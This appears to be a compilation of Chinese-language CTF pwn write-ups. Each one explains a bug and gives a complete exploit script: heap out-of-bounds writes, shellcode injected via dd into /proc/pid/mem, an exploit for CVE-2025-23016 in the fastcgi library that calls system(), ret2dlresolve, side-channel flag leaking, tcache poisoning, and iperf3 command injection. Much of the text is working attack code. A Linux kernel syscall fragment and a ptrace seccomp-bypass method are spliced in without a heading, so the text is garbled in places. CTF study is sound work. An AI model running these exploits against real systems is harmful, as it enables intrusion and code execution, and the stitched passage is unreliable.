The Classic Notes App题目功能create_note: 先分配一个新的 void* notes[note_count] 再分配新的notewrite_note: 按 offset 偏移写入 note ，长度有检查，但 offset 没有 题目自定义了发生 SIGSEGV 时的 handler 1234sigemptyset(&s.sa_mask);s.sa_flags = 0x40000000;s.sa_handler = (__sighandler_t)handler;sigaction(11, &s, 0LL); handler 中对 void *my_function_frames[] 进行了遍历，这个结构体 +0 位置是一个 char* name，如果这个字符串为 exit 就会调用 +8 位置的函数指针指向的函数 123456789101112131415161718void __noreturn handler(){ int i; // [xsp+34h] [xbp+34h] puts("SIGFAULT!"); for ( i = 0; i <= 7; ++i ) { if ( my_function_frames ) { if ( !strcmp((const char *)(my_function_frames + 16LL * i), "exit") ) { puts("Calling exit from function frames"); (*(void (__fastcall **)(__int64))(my_function_frames + 16LL * i + 8))(0xFFFFFFFFLL); } } } exit(-1);} flag 函数读取并输出 flag。 原有的 my_function_frame 已经有 name 为 flag 的 flag 函数了，只需要把 name 从 flag 改成 exit 就会在触发 SIGSEGV 后调用到。 漏洞点在 W 指令里面没有检查 offset ，导致堆 oob 任意 offset 写 利用思路部分写篡改 void* notes[] 中的 char* note (1/16) ， 将它指向 my_function_frames 然后把 frame 中 name 字段的值从 flag 改成 exit 最后写非法地址触发 SIGSEGV exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586#!/usr/bin/env python""" author: St4ckC00ki3"""from pwncli import *filename = "ctf"libcname = ""host = "the-classic-notes-app.2025.ctfcompetition.com"port = 1337elf = context.binary = ELF(filename)context.terminal = ["tmux", "neww"]context.log_level = "debug"if libcname != "": libc = ELF(libcname)gs = """b main"""def start(): if args.GDB: return gdb.debug(elf.path, gdbscript=gs) elif args.REMOTE: return remote(host, port) else: # return process(elf.path) return process('qemu-aarch64 -L /usr/aarch64-linux-gnu ' + elf.path, shell = True)p = start()s = lambda x: p.send(x)sl = lambda x: p.sendline(x)sa = lambda x, y: p.sendafter(x, y)sla = lambda x, y: p.sendlineafter(x, y)r = lambda x: p.recv(x)ru = lambda x: p.recvuntil(x)rl = lambda x: p.recvline(x)ia = lambda: p.interactive()# Your exploit heredef cmd(i): sla("command:
", i)def add(size): cmd('C' + str(size)) def read(idx): cmd('R' + str(size))def write(idx, off, size, content): pay = flat('W' , str(idx) , ' ' , str(off) , ' ' , str(size) , content) cmd(pay)def exp(): payload = p16(0x02a0) write(1, 0x20, len(payload), payload) payload = b'exit' write(0, 0x0, len(payload), payload) payload = b'\xff'*8 write(1, 0x20, len(payload), payload) payload = b'crash' write(0, 0x0, len(payload), payload) if b'FLAG' in p.recvrepeat(0.5): ia()while True: try: exp() except: pass p.close() p = start() DataDefinition题目功能运行 dd能控制 dd 参数和运行 dd 后的一次输入 123456789101112131415161718192021222324252627282930313233343536# Copyright 2025 Google LLC## Licensed under the Apache License, Version 2.0 (the "License");# you may not use this file except in compliance with the License.# You may obtain a copy of the License at## https://www.apache.org/licenses/LICENSE-2.0## Unless required by applicable law or agreed to in writing, software# distributed under the License is distributed on an "AS IS" BASIS,# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.# See the License for the specific language governing permissions and# limitations under the License.import subprocessimport sysdef main(): print('Do you like dd? It is my favorite old-style tool :D
') line = input(' > What is your favorite dd line?: ').encode() user_input = input(' > Any input to go with it?: ') print(user_input) user_input = user_input.encode() print('I like it! Let\'s give it a go!') res = subprocess.run(['dd'] + line.split(), input=user_input, capture_output=True) print(res.stdout.decode('utf-8')) print(res.stderr.decode('utf-8')) print('It was fun, bye!') input()if __name__ == '__main__': main() 漏洞点ddexec 写入 /proc/$pid/mem 篡改进程的内存而用 dd 可以自选偏移写入文件，也就可以偏移到 rx 段写入 shellcode，进而劫持控制流 利用思路python3.12 进程在结束时会调用 Py_FinalizeEx，所以 dd 设置偏移到这个函数的位置写入 execve("/bin/sh",0,0) shellcode 然而 python 读入时进行了 encode() ，意味着只能读入 unicode 范围内的字符所以 shellcode 要全部为 unicode 字符 exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263from pwncli import *import subprocesscontext.log_level = "debug"context.arch = "amd64"if args.REMOTE: p = remote('datadefinition.2025.ctfcompetition.com', 1337)else: p = process(['python3', './chall.py'])if args.REMOTE: p.recvuntil(b'You can run the solver with:
') cmmd = p.recvline()[:-1] result = subprocess.run( ["bash", "-c", cmmd], capture_output=True, text=True, check=True ) p.sendline(result.stdout)finalize = 0x0006B10A0 # Py_FinalizeExp.recvuntil(b'dd line?: ')if args.REMOTE: p.sendline(f'of=/proc/{1}/mem bs=1 seek={finalize}')else: p.sendline(f'of=/proc/{pidof(p)[0]}/mem bs=1 seek={finalize}')p.recvuntil(b'with it?: ')code = """push 0x5a58555apop raxxor eax, 0x34313775xor dword ptr [rsp+0x10], eaxpush 0x6a51475apop raxxor eax, 0x6a393475xor dword ptr [rsp+0x14], eaxpop rdipop rdipush rsppop rdipush 0x3bpop raxpush 0pop rsipush 0pop rdxsyscall"""shellcode = asm(code)p.sendline(shellcode)p.interactive()

d3cgi漏洞点CVE-2025-23016 fcgiapp.c#L1173 12nameValue = (char *)Malloc(nameLen + valueLen + 2);if(FCGX_GetStr(nameValue, nameLen, stream) != nameLen) { size+2 运算造成的整型溢出导致可以 malloc 小堆块，并在写入堆块时堆溢出 fcgiapp.c#L175 FCGX_GetStr 函数中调用 struct FCGX_Stream 中的 fillBuffProc 函数指针 调用条件： isReader 非 null isClosed 为 null 123456789101112131415161718typedef struct FCGX_Stream { unsigned char *rdNext; /* reader: first valid byte * writer: equals stop */ unsigned char *wrNext; /* writer: first free byte * reader: equals stop */ unsigned char *stop; /* reader: last valid byte + 1 * writer: last free byte + 1 */ unsigned char *stopUnget; /* reader: first byte of current buffer * fragment, for ungetc * writer: undefined */ int isReader; //+16 条件1：非null int isClosed; //+20 条件2：null 截断command int wasFCloseCalled; int FCGI_errno; /* error status */ void (*fillBuffProc) (struct FCGX_Stream *stream); void (*emptyBuffProc) (struct FCGX_Stream *stream, int doClose); void *data;} FCGX_Stream; 利用思路 对于每个请求会释放重新分配 struct FCGX_Stream ，第一次请求制造下一次请求的struct FCGX_Stream 上方的空闲堆块。然后切割 ub ，使得下一次请求 nameValue 能分配到 struct FCGX_Stream 正上方的堆块 （大小0x10） 第二次请求堆溢出篡改 struct FCGX_Stream ，劫持其中的 fillBuffProc 函数指针到 system FCGX_GetStr 函数会调用 struct FCGX_Stream 中的 fillBuffProc 函数指针，参数为struct FCGX_Stream ，此时等于执行 system(stream) 。指令长度20字符以内 靶机不出网，新建一个lighttpd默认配置，根路径设置到 /home/ctf ，然后把原来的lighttpd kill了重启一个朴素的 在浏览器访问flag文件 exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485from pwn import *context.log_level='debug'"""typedef struct { unsigned char version; unsigned char type; unsigned char requestIdB1; unsigned char requestIdB0; unsigned char contentLengthB1; unsigned char contentLengthB0; unsigned char paddingLength; unsigned char reserved;} FCGI_Header;"""def makeHeader(type, requestId, contentLength, paddingLength): header = p8(1) + p8(type) + p16(requestId) + p16(contentLength)[::-1] + p8(paddingLength) + p8(0) return header"""typedef struct { unsigned char roleB1; unsigned char roleB0; unsigned char flags; unsigned char reserved[5];} FCGI_BeginRequestBody;"""def makeBeginReqBody(role, flags): return p16(role)[::-1] + p8(flags) + b"\x00" * 5def start(): #return remote('127.0.0.1',9999) return remote('35.241.98.126',30882)def pwn(cmdd): io=start() pl=b'' pl+=makeHeader(1,1,8,0) pl+=makeBeginReqBody(1,0) pl+=makeHeader(9,0,0x28*2+8*4,0) pl+=(p8(0x13)+p8(0x13)+b'z'*0x26)+(p8(3)+p8(3)+b'c'*6)*4+(p8(0x13)+p8(0x13)+b'b'*0x26) io.send(pl) io.close() io=start() elf=ELF('files/challenge') pl=b'' pl+=makeHeader(1,1,8,0) pl+=makeBeginReqBody(1,0) pl+=makeHeader(9,0,0x900,0) print(cmdd) pl+=p32(0xffffffff)*2+b'a'*0x10+cmdd+p32(0)*3+p32(elf.plt['system']) io.send(pl) io.interactive()def pad(data): padding_length = (5 - len(data)) % 5 padded_data = data + b' ' * padding_length return padded_datacmd=pad(b'server.document-root="/home/ctf"
server.port=8888
')for i in range(len(cmd)//5): pwn(b' ;echo -n \''+cmd[i*5:(i+1)*5]+b'\'>>a') pause(1)cmd=pad(b'pkill -9 lighttpd
./lighttpd -f a
')for i in range(len(cmd)//5): pwn(b' ;echo -n \''+cmd[i*5:(i+1)*5]+b'\'>>b') pause(1)pwn(b' ;chmod +x b;./b'.ljust(20,b' '))# curl http://ip:port/flag

Pwnonly_read题目功能 漏洞点由于是libc 2.34+编译，elf中已经没有csu等常见gadget，唯一可利用的是leave，可以用来控制rbp。又因为取buf地址时通过计算rbp-0x80来获取，操控rbp相当于能控制read写入的地址，达成写任意地址原语。controlling-rbp 利用思路由于没有 libc leak ，又缺少 gadget ，考虑不需要泄露的 ret2dlresolve。与常规ret2dlresolve不同的是，因为没有 pop rdi ; ret 的gadget，不能是最后调用system，要直接劫持rip到one_gadget。 其他思路@Tplus 师傅的方法：通过rbp来控制rax，这样部分写read got为syscall就可以sigreturn进行srop exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123#!/usr/bin/env python''' author: GeekCmore time: 2025-04-26 18:26:00'''from pwn import *filename = "only_read_patched"libcname = "/home/botdebug/.config/cpwn/pkgs/2.39-0ubuntu8.4/amd64/libc6_2.39-0ubuntu8.4_amd64/usr/lib/x86_64-linux-gnu/libc.so.6"host = "1.95.129.168"port = 9999elf = context.binary = ELF(filename)context.terminal = ['tmux', 'neww']context.log_level = "debug"if libcname: libc = ELF(libcname)gs = '''b *0x401153set debug-file-directory /home/botdebug/.config/cpwn/pkgs/2.39-0ubuntu8.4/amd64/libc6-dbg_2.39-0ubuntu8.4_amd64/usr/lib/debug'''def start(): if args.GDB: return gdb.debug(elf.path, gdbscript = gs) elif args.REMOTE: return remote(host, port) else: return process(elf.path)p = start()def leak_address(): if context.arch == 'i386': return u32(p.recv(4)) else: return u64(p.recv(6).ljust(8, b'\x00'))def leak_address2(timeout=0.1): contains = b"\x7f" if context.bits == 64 else b"\xf7" m = p.recvuntil(contains, timeout=timeout) if contains not in m: raise RuntimeError("Cannot get libc addr") if context.bits == 32: return u32(m[-4:]) else: return u64(m[-6:])def dbg(): if args.AT: gdb.attach(p,gs) pause()s = lambda x : p.send(x)sl = lambda x : p.sendline(x)sa = lambda x , y : p.sendafter(x , y)sla = lambda x , y : p.sendlineafter(x , y)r = lambda x : p.recv(x)ru = lambda x : p.recvuntil(x)rl = lambda x : p.recvline(x)ia = lambda : p.interactive()op32 = make_packer(32, endian='big', sign='unsigned') # opposite p32op64 = make_packer(64, endian='big', sign='unsigned') # opposite p64rop = ROP(elf)n64 = lambda x: (x + 0x10000000000000000) & 0xFFFFFFFFFFFFFFFFdef build_fake_link_map(fake_linkmap_addr, func, base_func='read'): offset = n64(func - libc.sym[base_func]) linkmap = p64(offset) # l_addr linkmap = linkmap.ljust(0x68, b'\x00') linkmap += p64(elf.bss()) # l_info[5] linkmap += p64(fake_linkmap_addr + 0x100) # l_info[6] linkmap = linkmap.ljust(0xf8, b'\x00') linkmap += p64(fake_linkmap_addr + 0x110) # l_info[23] linkmap += p64(0) + p64(elf.got[base_func] - 8) # Elf64_Dyn linkmap += p64(0) + p64(fake_linkmap_addr + 0x120) # Elf64_Dyn linkmap += p64(n64(elf.bss() - offset)) + p32(7) + p32(0) # Elf64_Rel return linkmapdef exp(): if args.REMOTE: ru("Submit the token generated by `hashcash -mb26") p.recvrepeat(0.5) sl(input()) ru(b'Here is your challenge~
') sleep(1) read_plt = 0x401040 read_got = 0x404000 read = 0x401142 write_addr = 0x404500 resolve_plt = elf.get_section_by_name('.plt').header.sh_addr fake_linkmap_addr = 0x404500 + 0x80 + 8*4 one_gadget = [0x583ec, 0x583f3, 0xef4ce, 0xef52b] payload = flat( "A" * 0x80, write_addr+0x80, # rbp #1 read # retaddr #1 ) s(payload) sleep(1) payload = flat( 0, flat( ).ljust(0x78, b"B"), # retaddr #3 elf.bss()+0x100, # rbp #2 resolve_plt + 6, # retaddr #2 fake_linkmap_addr, 0, build_fake_link_map(fake_linkmap_addr, one_gadget[3]) ) s(payload) ia()exp() AFL sandbox (复盘)题目功能用afl fuzz一个程序 harness， harness 功能是从 /tmp/shellcode 读入shellcode并执行 harness启用沙盒 可以orw，但是 AFL 会将 stdout, stderr 重定向到 /dev/null 利用思路由于AFL会反馈程序是运行超时还是crash，通过这两个的区别来侧信道爆破flag exp12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182from pwn import *context.arch = "amd64"context.bits = 64# context.log_level = "ERROR"if not args.REMOTE: file = open('/tmp/shellcode.bin', 'wb')zeros = '0'*12difficulty = 12def is_valid(digest): if sys.version_info.major == 2: digest = [ord(i) for i in digest] bits = ''.join(bin(i)[2:].zfill(8) for i in digest) return bits[:difficulty] == zerosdef sol(prefix): i = 0 while True: i += 1 s = prefix + str(i) if is_valid(hashlib.sha256(s.encode()).digest()): return idef check(i, c): shellcode = " push rbp
" shellcode += " sub rsp, 300
" shellcode += shellcraft.open('/flag') shellcode += shellcraft.read('rax', 'rsp', 100) shellcode += f""" cmp byte ptr[rsp+{i}], {c} jbe $ """ shellcode = asm(shellcode) if not args.REMOTE: file.write(shellcode) exit(0) # p = process(["python", "./wrapper.py"]) p = remote("127.0.0.1", 9999) p.recvuntil(b"sha256(") prefix = p.recvuntil(b" +", True).decode() p.sendline(str(sol(prefix)).encode()) p.recvline("> ") p.recvline("so, upload your program (in hex encoding)") p.sendline(shellcode.hex().encode()) p.recvline("> ") p.sendline() res = p.recvrepeat(15) p.close() if b'Timeout' in res: return True elif b'crash with': return Falsei = 0flag = ""while True: l = 0x20 r = 0x7f while l < r: m = (l+r)//2 if check(i,m): r = m else: l = m+1 sleep(5) flag += chr(l) log.info(f"flag: {flag}") if "}" in flag: break i+=1

posts.text: typo题目功能12345struct chunk{ _QWORD size; char buf[size];} 标准菜单题 add: size<=0x200free: 指针清零edit: 设置新size并输入无show 漏洞点edit 中往 chunk 上写入新 size 时 sprintf 参数位置错误，导致往 chunk 写 size 时越界写同时也存在格式化字符串漏洞 ，\x00截断 构造chunk overlap 释放到然后partial overwrite fd到stdout，通过stdout leak 修复思路比赛时思路比赛时是硬是把参数位置纠正了 1234567891011.text:0000000000001662 lea rsi, maxlen ; "%lu".text:0000000000001669 mov eax, [rbp+var_11C].text:000000000000166F cdqe.text:0000000000001671 lea rdx, ds:0[rax*8].text:0000000000001679 lea rax, chunks.text:0000000000001680 mov rax, [rdx+rax].text:0000000000001684 lea rdx, [rbp+s] ; format.text:000000000000168B mov ecx, 8.text:0000000000001690 mov rdi, rax ; s.text:0000000000001693 mov eax, 0.text:0000000000001698 call _snprintf 更多思路学习一下其他师傅的思路：_snprintf改为printf N0wayBack直接nop call _snprintf rbp将snprintf函数nop掉修改为直接给heap->size赋值 S1nyer break思路先free一个到tcache，然后在该堆块上利用堆溢出改大size制造heap overlap，最后通过分配来切割overlap的chunk，让tcaches fd踩上libc地址 因为sprintf末尾自动加\x00，不好paritial overwrite fd，再构造一个overlap，使得分配到踩上了libc地址的tcache chunk上方，从而能parital overwrite fd为stdout，通过stdout泄露libc地址 最后因为是2.31可以tcache poisoning打free_hook为system，getshell This must comes first, since * the ABI here can be something that doesn't make sense for * other syscall_work features. */ if (work & SYSCALL_WORK_SYSCALL_USER_DISPATCH) { if (syscall_user_dispatch(regs)) return -1L; } /* Handle ptrace */ if (work & (SYSCALL_WORK_SYSCALL_TRACE | SYSCALL_WORK_SYSCALL_EMU)) { ret = ptrace_report_syscall_entry(regs); if (ret || (work & SYSCALL_WORK_SYSCALL_EMU)) return -1L; } /* Do seccomp after ptrace, to catch any tracer changes. */ if (work & SYSCALL_WORK_SECCOMP) { ret = __secure_computing(NULL); if (ret == -1L) return ret; } /* Either of the above might have changed the syscall number */ syscall = syscall_get_nr(current, regs); if (unlikely(work & SYSCALL_WORK_SYSCALL_TRACEPOINT)) trace_sys_enter(regs, syscall); syscall_enter_audit(regs, syscall); return ret ? : syscall;} 利用流程先fork一个子进程，子进程开始先int3中断使得主进程能在shellcraft.cat("./flag")前开始TRACE SYSCALL 主进程用PTRACE去TRACE子进程 SYSCALL,trace第一次触发在syscall入口时修改RIP至一个非法高位地址，即可 bypass seccomp检查进行一次系统调用 之后在执行完syscall后再次触发TRACE SYSCALL，此时将RIP设回合法值继续执行即可 posts.text: where is my rop利用思路login.cgi 在登录时使用POST和login.cgi交互，其中Authorization头格式是username:加密的password，载荷是session id。 在login.cgi中会使用libCgi.so中的send_cmd函数和basement使用socket交互，但调用函数之前有检查： session id长度要是24，这里直接按正常流程GET cgi-bin/gen_enc?id获取session id。 header中Authorization的值取”Basic “后的检查：要在base64加密字符集内 漏洞点：在login.cgi中main函数对Authorization请求头解析时对内容长度的限制非常宽松，允许最大0x400长度的base64密文输入，而base64解码后存储的位置仅0x200大小，存在溢出，可以篡改_BYTE opcode全局变量 base64解密后检查是否有三个冒号分隔，且各个分段长度不超过0x80。 检查通过以后会调用send_cmd函数 由以上条件可知auth_parms一定得是类似Basic AAAA:BBBB:CCCC:DDDD的格式才能执行到send_cmd与basement交互 send_cmd函数功能是向basement监听的/tmp/tpctf.sock建立socket连接并传输这几个参数send_cmd定义如下： 1char *__fastcall send_cmd(int opcode, int length, char *payload) 第一个参数代表了要访问basement的功能编号 第二个是payload长度 第三个是指向payload的指针 basementbasement的main函数先读取opcode,然后是length，最后payload , 然后按照opcode调用分别的功能函数 由于我们能完全控制opcode，可以指定调用1-12任意的功能函数 1-5 sqlite3数据库操作 6-9 iperf3, ping, traceroute 命令执行，存在命令注入 10-12 假装使用acme.sh注册证书命令执行， 题目中的acme.sh其实是一个空的脚本文件 所有命令注入的位置都使用isSafeCommandArg()过滤字符 12345from ctypes import *l = CDLL("./libCgi.so")for i in range(0x1, 0x7f): if l.isSafeCommandArg(chr(i)): print(chr(i)), end="") 使用脚本获取的允许的字符集如下： 1\r\t!"#%'()*+,-./0123456789:=?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]_abcdefghijklmnopqrstuvwxyz{}~% 禁用了所有的管道符、分号、换行等，不能在原指令基础上另起一个新的指令，只能试着改程序的参数 其中iperf3可以传输文件，但是机器不出网，无法连接到服务器端口但iperf3有可以输出文件的选项 1--logfile f send output to a log file 与此同时还支持自定义日志每行最左端时间戳的样式，使得日志每行开头都可控，注入指令后利用#注释可以将无关部分去除，实现给指定文件写入任意shell指令 1--timestamps<=format> emit a timestamp at the start of each output line 10-12 功能运行了acme.sh这个sh脚本，考虑先用功能6将要执行的shell指令写入acme.sh，再使用功能10运行acme.sh 尝试 cp /*flag* /var/www/html/flag，本地成功但远程访问/flag时404，怀疑flag文件名有改动，使用 1tar -zcvf /var/www/html/flag.tar --exclude=/proc --exclude=/sys / 将根目录下除过滤的目录外全部压缩，然后浏览器访问/flag.tar下载即可得到flag远程flag文件名被改成了the_flaG_is_here056480436103548697634文件名中的G大写导致了之前没有成功复制文件 exp123456789101112131415161718192021222324252627282930313233343536373839import requestsimport base64session = requests.Session()rl = "61.147.171.105:54863"# rl = "127.0.0.1"# 获取session id url = f"http://{rl}/cgi-bin/gen_enc?id"response = session.get(url)id = response.text.replace("<html><body>","").replace("</body></html>", "")def login(opcode, auth_parms): url = f"http://{rl}/cgi-bin/login.cgi?login" data = "id=" + id auth_parms = auth_parms.ljust(0x200, b"\x00") auth_parms += bytes([opcode]) + b"\x61" auth_parms = base64.b64encode(auth_parms).decode() headers = { "Content-Type": "application/x-www-form-urlencoded", "Authorization": "Basic " + auth_parms } response = session.post(url, data=data, headers=headers) login_result = response.headers['X-Redirect-URL'] print(login_result) print(f"状态码: {response.status_code}") print()# 向acme.sh注入指令：压缩根目录所有文件auth_parms = b"2.1.1.1:1234 --logfile /root/.acme.sh/acme.sh --timestamps=\"tar -zcvf /var/www/html/flag.tar --exclude=/proc --exclude=/sys / #\":CCCC:DDDD\x00"login(0x6, auth_parms)# 触发执行acme.shauth_parms = b"AAAA:BBBB:CCCC:DDDD\x00"login(0xb, auth_parms)
